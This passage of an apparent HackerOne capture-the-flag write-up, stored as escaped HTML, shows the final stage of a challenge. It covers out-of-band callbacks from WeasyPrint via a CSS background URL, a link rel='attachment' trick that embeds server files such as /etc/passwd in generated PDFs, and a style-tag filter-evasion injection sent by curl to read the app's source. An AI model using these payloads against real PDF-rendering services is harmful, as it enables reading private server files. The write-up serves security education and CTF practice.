class=\"nt\"\u003e\u0026gt;\u003c/span\u003eInvoices\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/li\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"c\"\u003e\u0026lt;!--\u0026lt;li  class=\u0026quot;nav-item\u0026quot; \u0026gt;\n        \u0026lt;a class=\u0026quot;nav-link\u0026quot; href=\u0026quot;/invoices/new\u0026quot;\u0026gt;New Invoice\u0026lt;/a\u0026gt;\n      \u0026lt;/li\u0026gt;--\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can modify the Invoice data and then generate a HTML preview or a PDF. Investigating the parameters to the request. I investigated\u003cbr\u003e\nthe parameters to the request to see what we could modify and exploit.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Acme Tools\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;accounting@acme.com\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;0001\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;2019-04-01\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"w\"\u003e\n        \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Test\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Test\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n        \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;body\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n            \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;background-color\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;white\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n        \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI tried modifying the CSS background property to a image which was hosted on a server controlled by me and I got a connect back.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e## background: url(\u0026#39;http://45.77.200.226:3002\u0026#39;);\u003c/span\u003e\nroot@vultr:~# nc \u003cspan class=\"nt\"\u003e-l\u003c/span\u003e \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e \u003cspan class=\"nt\"\u003e-p\u003c/span\u003e 3002\nListening on \u003cspan class=\"o\"\u003e[\u003c/span\u003e0.0.0.0] \u003cspan class=\"o\"\u003e(\u003c/span\u003efamily 0, port 3002\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nConnection from 98.12.196.104.bc.googleusercontent.com 35548 received!\nGET / HTTP/1.1\nHost: 45.77.200.226:3002\nUser-Agent: WeasyPrint 44 \u003cspan class=\"o\"\u003e(\u003c/span\u003ehttp://weasyprint.org/\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nAccept: \u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\nAccept-Encoding: \u003cspan class=\"nb\"\u003egzip\u003c/span\u003e, deflate\nConnection: close\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow I know that the server is using the WeasyPrint library to convert the HTML to PDF. From here, I spent a lot of time on trying to mess with SVGs\u003cbr\u003e\nused in the background, and try to extract files out of the file system, but nothing worked.\u003c/p\u003e\n\n\u003cp\u003eAfter giving up on the SVG track, I tried reading the source code of the WeasyPrint library to try and find something I could use. I found a feature that allowed\u003cbr\u003e\nme to insert attachments into the pdf.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# https://github.com/Kozea/WeasyPrint/blob/master/weasyprint/html.py#L307\n\u003c/span\u003e\u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"n\"\u003eelement\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etag\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;link\u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003eelement_has_link_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eelement\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;attachment\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eget_url_attribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eelement\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;href\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_url\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etitle\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eelement\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;title\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"ow\"\u003eis\u003c/span\u003e \u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eLOGGER\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Missing href in \u0026lt;link rel=\u0026quot;attachment\u0026quot;\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eattachments\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo test my theory, I created a simple HTML file and converted it to a PDF using \u003ccode\u003eWeasyPrint\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecat \u003c/span\u003etest.html\n\u0026lt;\u003cspan class=\"nb\"\u003elink \u003c/span\u003e\u003cspan class=\"nv\"\u003erel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;attachment\u0026quot;\u003c/span\u003e \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;file:///etc/passwd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eweasyprint test.html test.pdf \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e\nINFO: Step 1 - Fetching and parsing HTML - test.html\nINFO: Step 3 - Applying CSS\nINFO: Step 4 - Creating formatting structure\nINFO: Step 5 - Creating layout - Page 1\nINFO: Step 6 - Drawing\nINFO: Step 7 - Adding PDF metadata\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOpening the PDF in the browser, I found the \u003ccode\u003epasswd\u003c/code\u003e file in the attachments!\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pdf_attachment.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/435/0feddf3550cbe094e67b80c3cf1df52465f5c138/pdf_attachment.png?response-content-disposition=attachment%3B%20filename%3D%22pdf_attachment.png%22%3B%20filename%2A%3DUTF-8%27%27pdf_attachment.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061159Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=509a1791b2c7d9c0395fecb8c435d21c76150ee83473ca96e90b9f603e2f6a4b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/435/0feddf3550cbe094e67b80c3cf1df52465f5c138/pdf_attachment.png?response-content-disposition=attachment%3B%20filename%3D%22pdf_attachment.png%22%3B%20filename%2A%3DUTF-8%27%27pdf_attachment.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061159Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=509a1791b2c7d9c0395fecb8c435d21c76150ee83473ca96e90b9f603e2f6a4b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSo now if I could somehow inject a link tag into the HTML that was generated by preview, I would have LFI on the system.\u003cbr\u003e\nI tried searching for inputs that were not sanitized, and I found one in the attribute-name in the CSS styles.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e$ curl \u0026#39;http://4eefcea7.ngrok.io/invoices/preview\u0026#39; -G --data-urlencode \u0026#39;d={\u0026quot;companyName\u0026quot;:\u0026quot;\u0026gt;\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;\u0026gt;\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;\u0026gt;\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;\u0026gt;\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1.5500\u0026quot;,\u0026quot;\u0026gt;\u0026quot;,\u0026quot;\u0026gt;\u0026quot;,\u0026quot;10\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;\u0026gt;\u0026quot;:{\u0026quot;\u0026gt;\u0026quot;:\u0026quot;\u0026gt;\u0026quot;}}}\u0026#39;\n\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u003c/span\u003e \u003cspan class=\"na\"\u003elang=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;en\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n...\n...\n...\n  \u003cspan class=\"nt\"\u003e\u0026lt;style\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003e.invoice-title\u003c/span\u003e \u003cspan class=\"nt\"\u003eh2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003e.invoice-title\u003c/span\u003e \u003cspan class=\"nt\"\u003eh3\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nl\"\u003edisplay\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003einline-block\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003e.table\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003etbody\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003etr\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nc\"\u003e.no-line\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nl\"\u003eborder-top\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003enone\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003e.table\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003ethead\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003etr\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nc\"\u003e.no-line\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nl\"\u003eborder-bottom\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003enone\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003e.table\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003etbody\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nt\"\u003etr\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nc\"\u003e.thick-line\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nl\"\u003eborder-top\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"m\"\u003e2px\u003c/span\u003e \u003cspan class=\"nb\"\u003esolid\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nt\"\u003egt\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"err\"\u003e\u0026gt;:\u003c/span\u003e \u003cspan class=\"err\"\u003e\u0026amp;gt;;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/style\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;row\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;col-xs-12\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;invoice-title\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;h2\u0026gt;\u003c/span\u003eInvoice\u003cspan class=\"nt\"\u003e\u0026lt;/h2\u0026gt;\u0026lt;h3\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;pull-right\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e# \u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/h3\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;hr\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;row\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;col-xs-6\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"nt\"\u003e\u0026lt;address\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;strong\u0026gt;\u003c/span\u003eBilled To:\u003cspan class=\"nt\"\u003e\u0026lt;/strong\u0026gt;\u0026lt;br\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;br\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\n          \u003cspan class=\"nt\"\u003e\u0026lt;/address\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n...\n...\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI tried to close the style tag, so that it would allow me to inject raw HTML, however the parser was completely filtering any closing tags.\u003cbr\u003e\nSo I used a common XSS filter evasion trick and wrapped the closing style tag with another closing style that: \u003ccode\u003e\u0026lt;/st\u0026lt;/style\u0026gt;yle\u0026gt;\u003c/code\u003e\u003cbr\u003e\nThat seemed to work.\u003c/p\u003e\n\n\u003cp\u003eI used the injection to extract the \u003ccode\u003e/app/main.py\u003c/code\u003e file which should be the source code of the app.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl \u0026#39;http://4eefcea7.ngrok.io/invoices/preview\u0026#39; -G --data-urlencode \u0026#39;d={\u0026quot;companyName\u0026quot;:\u0026quot;\u0026gt;\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;\u0026gt;\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;\u0026gt;\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;\u0026gt;\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1.5500\u0026quot;,\u0026quot;\u0026gt;\u0026quot;,\u0026quot;\u0026gt;\u0026quot;,\u0026quot;10\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;a\u0026quot;:{\u0026quot;} \u0026lt;/st\u0026lt;/style\u0026gt;yle\u0026gt; \u0026lt;link rel=\u0026#39;\u0026#39;attachment\u0026#39;\u0026#39; href=\u0026#39;\u0026#39;file:///app/main.py\u0026#39;\u0026#39;\u0026gt; \u0026quot;:\u0026quot;a\u0026quot;}}}\u0026#39;\n...\n...\n    a {\n      } \u0026lt;/style\u0026gt; \u0026lt;link rel=\u0026#39;attachment\u0026#39; href=\u0026#39;file:///app/main.py\u0026#39;\u0026gt; : a;\n    }\n  \u0026lt;/style\u0026gt;\n...\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe preview looked good, and pdfize returned the pdf with the source code in the attachment!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u0026quot;\nCONGRATULATIONS!\n\nIf you\u0026#39;re reading this, you\u0026#39;ve made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include \u0026#39;c8889970d9fb722066f31e804e351993\u0026#39; in the report, so we know for sure you made it through!\n\nCongratulations again, and I\u0026#39;m sorry for the red herrings. :)\n\u0026quot;\u0026quot;\u0026quot;\u003c/span\u003e\n\n\u003cspan 